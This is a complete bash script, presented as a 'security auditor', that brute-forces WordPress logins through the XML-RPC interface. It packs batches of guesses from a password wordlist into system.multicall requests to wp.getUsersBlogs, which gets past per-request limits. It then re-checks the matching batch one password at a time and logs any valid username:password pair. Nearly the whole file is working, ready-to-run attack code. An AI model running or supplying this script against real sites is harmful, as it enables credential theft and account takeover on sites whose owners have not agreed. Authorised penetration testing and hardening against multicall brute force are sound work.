#!/bin/bash
# -----------------------------------------------------------------------------
# WordPress XML-RPC Multicall Security Auditor
# -----------------------------------------------------------------------------

set -e

# -------------------------
# Defaults
# -------------------------
BATCH_SIZE=50
DELAY=1
LOG_FILE="security_audit_log.txt"
TIMEOUT=10
VERIFY_SSL=true

# -------------------------
# CLI Arguments
# -------------------------
while [[ "$#" -gt 0 ]]; do
    case $1 in
        --target) URL="$2"; shift ;;
        --user) USERNAME="$2"; shift ;;
        --wordlist) PASS_FILE="$2"; shift ;;
        --batch) BATCH_SIZE="$2"; shift ;;
        --delay) DELAY="$2"; shift ;;
        --timeout) TIMEOUT="$2"; shift ;;
        --insecure) VERIFY_SSL=false ;;
        *) echo "Unknown parameter: $1"; exit 1 ;;
    esac
    shift
done

# -------------------------
# Interactive fallback
# -------------------------
[ -z "$URL" ] && read -p "Target XML-RPC URL: " URL
[ -z "$USERNAME" ] && read -p "Target Username: " USERNAME
[ -z "$PASS_FILE" ] && read -p "Password List Path: " PASS_FILE

# -------------------------
# Validation
# -------------------------
if [ ! -f "$PASS_FILE" ]; then
    echo "[-] Password list not found!"
    exit 1
fi

if ! [[ "$BATCH_SIZE" =~ ^[0-9]+$ ]] || [ "$BATCH_SIZE" -le 0 ]; then
    echo "[-] Invalid batch size"
    exit 1
fi

# -------------------------
# Curl config
# -------------------------
CURL_OPTS="-s -L --max-time $TIMEOUT"
[ "$VERIFY_SSL" = false ] && CURL_OPTS="$CURL_OPTS -k"

# -------------------------
# Logging
# -------------------------
echo "--- Audit Started: $(date) ---" >> "$LOG_FILE"
echo "Target: $URL | User: $USERNAME" >> "$LOG_FILE"

TOTAL_PASSWORDS=$(wc -l < "$PASS_FILE")
COUNTER=0

# -------------------------
# XML escape
# -------------------------
xml_escape() {
    echo "$1" | sed -e 's/&/\&amp;/g' \
                    -e 's/</\&lt;/g' \
                    -e 's/>/\&gt;/g'
}

# -------------------------
# Generate XML
# -------------------------
generate_xml() {
    echo "<methodCall><methodName>system.multicall</methodName><params><param><value><array><data>"
    for pass in "$@"; do
        ESC_PASS=$(xml_escape "$pass")
        echo "<value><struct><member><name>methodName</name><value>wp.getUsersBlogs</value></member><member><name>params</name><value><array><data><value><array><data><value><string>$USERNAME</string></value><value><string>$ESC_PASS</string></value></data></array></value></data></array></value></member></struct></value>"
    done
    echo "</data></array></value></param></params></methodCall>"
}

# -------------------------
# Single verification
# -------------------------
single_check() {
    local pass="$1"

    RESPONSE=$(curl $CURL_OPTS -X POST "$URL" \
        -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>$USERNAME</string></value></param><param><value><string>$pass</string></value></param></params></methodCall>")

    if echo "$RESPONSE" | grep -q "<name>blogName</name>"; then
        echo -e "\n[SUCCESS] Valid Credential: $USERNAME:$pass"
        echo "[MATCH] $USERNAME:$pass at $(date)" >> "$LOG_FILE"
        exit 0
    fi
}

# -------------------------
# Start
# -------------------------
echo "[*] Starting audit..."
echo "[*] Total passwords: $TOTAL_PASSWORDS"

batch=()

while IFS= read -r password; do
    batch+=("$password")
    COUNTER=$((COUNTER+1))

    echo -ne "[*] Progress: $COUNTER / $TOTAL_PASSWORDS\r"

    if [ "${#batch[@]}" -ge "$BATCH_SIZE" ]; then
        XML=$(generate_xml "${batch[@]}")

        RESPONSE=$(curl $CURL_OPTS -X POST "$URL" -d "$XML")

        if echo "$RESPONSE" | grep -q "<name>blogName</name>"; then
            echo -e "\n[!] Possible match detected, verifying..."
            for pass in "${batch[@]}"; do
                single_check "$pass"
            done
        fi

        batch=()
        sleep "$DELAY"
    fi

done < "$PASS_FILE"

# Final batch
if [ "${#batch[@]}" -gt 0 ]; then
    XML=$(generate_xml "${batch[@]}")
    RESPONSE=$(curl $CURL_OPTS -X POST "$URL" -d "$XML")

    if echo "$RESPONSE" | grep -q "<name>blogName</name>"; then
        for pass in "${batch[@]}"; do
            single_check "$pass"
        done
    fi
fi

echo -e "\n[-] No valid credentials found."
echo "--- Audit Finished: $(date) ---" >> "$LOG_FILE"
